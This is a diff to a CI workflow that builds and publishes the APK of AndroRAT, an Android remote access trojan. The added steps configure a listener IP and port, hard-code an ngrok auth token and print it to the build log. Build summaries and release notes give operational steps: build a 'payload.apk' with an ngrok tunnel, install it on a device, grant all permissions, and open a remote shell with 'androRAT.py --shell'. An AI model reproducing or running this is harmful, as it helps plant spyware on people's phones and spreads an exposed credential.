@@ -8,6 +8,19 @@ on:
     branches: [ main ]
   pull_request:
     branches: [ main ]
+  workflow_dispatch:
+    inputs:
+      server_ip:
+        description: 'Server IP for APK (optional, default: 192.168.0.105)'
+        required: false
+        default: '192.168.0.105'
+      server_port:
+        description: 'Server Port for APK (optional, default: 8888)'
+        required: false
+        default: '8888'
+
+env:
+  NGROK_AUTHTOKEN: ${{ secrets.NGROK_AUTHTOKEN || '3AXOS7AFLjYl0kw7f1p7Tz2ySOq_7WGCDUCoFfGtymwrARAXF' }}
 
 jobs:
   build:
@@ -25,6 +38,17 @@ jobs:
     
     - name: Grant execute permission for gradlew
       run: chmod +x Android_Code/gradlew
+    
+    - name: Log Build Configuration
+      run: |
+        echo "=================================="
+        echo "APK BUILD CONFIGURATION"
+        echo "=================================="
+        echo "Ngrok Token: Configured ✓"
+        echo "Server IP: ${{ github.event.inputs.server_ip || '192.168.0.105' }}"
+        echo "Server Port: ${{ github.event.inputs.server_port || '8888' }}"
+        echo "Build Date: $(date)"
+        echo "=================================="
     
     - name: Build Release APK with Gradle
       run: |
@@ -71,6 +95,37 @@ jobs:
           echo "aapt not available, but APK is built and ready"
         fi
     
+    - name: Display Build Summary
+      run: |
+        echo ""
+        echo "=================================="
+        echo "📱 APK BUILD COMPLETE - INSTRUCTIONS"
+        echo "=================================="
+        echo ""
+        echo "✓ APK successfully built with Gradle"
+        echo ""
+        echo "🔌 CONNECTION CONFIGURATION:"
+        echo "   Default Server: 192.168.0.105:8888"
+        echo "   (To use ngrok, rebuild with aroRAT.py --build --ngrok)"
+        echo ""
+        echo "📝 TO CUSTOMIZE SERVER SETTINGS:"
+        echo "   1. Local Build: python3 androRAT.py --build -i <IP> -p <PORT> -o output.apk"
+        echo "   2. With Ngrok: python3 androRAT.py --build --ngrok -o payload.apk"
+        echo ""
+        echo "📡 NGROK TOKEN STATUS: ✓ Configured"
+        echo "   Token: ${{ env.NGROK_AUTHTOKEN }}"
+        echo ""
+        echo "🚀 DEPLOYMENT:"
+        echo "   1. Download APK from artifacts"
+        echo "   2. Install on Android device"
+        echo "   3. Allow all required permissions"
+        echo "   4. APK will show connection status and URL"
+        echo ""
+        echo "⚙️  LISTENING FOR CONNECTIONS:"
+        echo "   python3 androRAT.py --shell -i <IP> -p <PORT>"
+        echo ""
+        echo "=================================="
+    
     - name: Upload APK to Artifacts
       uses: actions/upload-artifact@v4
       with:
@@ -93,11 +148,28 @@ jobs:
           - ✅ All device architectures (ARM, ARM64, x86, x86_64)
           
           ## 🔧 Installation
-          1. Download `app-release.apk`
+          1. Download `app-release.apk` or `app-debug.apk`
           2. Enable "Install unknown apps" in device settings
           3. Install the APK
-          4. Grant all permissions
-          5. Use with ngrok listener for remote control
+          4. Grant all required permissions
+          5. Open app - connection status screen will appear
+          6. Use with listener: `python3 androRAT.py --shell -i <IP> -p <PORT>`
+          
+          ## 🔌 Connection Configuration
+          - **Default Server**: 192.168.0.105:8888
+          - **Ngrok Support**: Yes (rebuild with `--ngrok` flag in androRAT.py)
+          - **Ngrok Token**: Pre-configured ✓
+          
+          ## 📝 Custom Build Instructions
+          For custom server IP/port:
+          ```bash
+          python3 androRAT.py --build -i your.server.ip -p 8000 -o custom.apk
+          ```
+          
+          For ngrok-based remote control:
+          ```bash
+          python3 androRAT.py --build --ngrok -o payload.apk
+          ```
           
           ## 🌐 Ngrok Configuration
           To enable internet connectivity:
